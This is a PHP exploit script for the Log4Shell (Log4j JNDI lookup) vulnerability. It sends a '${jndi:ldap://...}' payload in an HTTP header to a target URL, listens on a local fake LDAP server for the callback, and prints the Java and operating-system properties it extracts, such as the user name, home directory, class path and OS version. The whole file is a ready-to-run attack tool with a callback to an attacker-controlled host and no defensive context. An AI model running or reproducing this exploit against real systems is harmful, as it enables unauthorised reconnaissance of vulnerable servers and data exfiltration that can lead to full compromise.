#!/usr/bin/php
# Nicholas Ferreira
# github.com/Nickguitar
# 14/12/21

<?php

$ldapResponse = "\x30\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\x00";

$arr = ["java.version","java.home","java.vm.specification.version","java.vm.specification.name","java.vm.version","java.vm.name","java.specification.version","java.specification.name","java.class.version","java.class.path","java.library.path","java.io.tmpdir","java.ext.dirs","os.name","os.arch","os.version","user.name","user.home","user.dir","user.country","user.language"];

$x = '';
foreach($arr as $item)
	$x .= '${sys:'.$item.'}|';

$payload = '${jndi:ldap://172.17.0.1:7359/SOF'.$x.'EOF}';

$ip = "127.0.0.1";
$port = 7359;
$sock = socket_create_listen($port);
socket_getsockname($sock, $ip, $port);
print "Server Listening on $ip:$port\n";

$ch = curl_init($argv[1]);
curl_setopt_array($ch, [
    CURLOPT_CUSTOMREQUEST => 'GET',
    CURLOPT_HTTPHEADER => [
        "X-Api-Version: $payload"
    ],
    CURLOPT_TIMEOUT => 1
]);

curl_exec($ch);
curl_close($ch);

while($c = socket_accept($sock)){
    socket_getpeername($c, $raddr, $rport);
    print "Received Connection from $raddr:$rport\n\n";
    socket_write($c, $ldapResponse, strlen($ldapResponse));
    $received="";
    while(socket_recv($c, $data, 8192, 0) !== ""){
        $received .= $data;
        if(strpos($data, "EOF") !== false)
            break;
    }
    break;
}

socket_close($sock);

preg_match("/.*534f46(.*)454f46.*/", bin2hex($received), $result);
$k = explode("|", hex2bin($result[1]));
echo "\n[+] Exfiltrated data:\n\n";
for($i=0;$i<count($k)-1;$i++){
	echo $arr[$i]."  =>  ".$k[$i]."\n";
	if($arr[$i] == "java.ext.dirs" || $arr[$i] == "os.version") echo "\n";
}


?>   
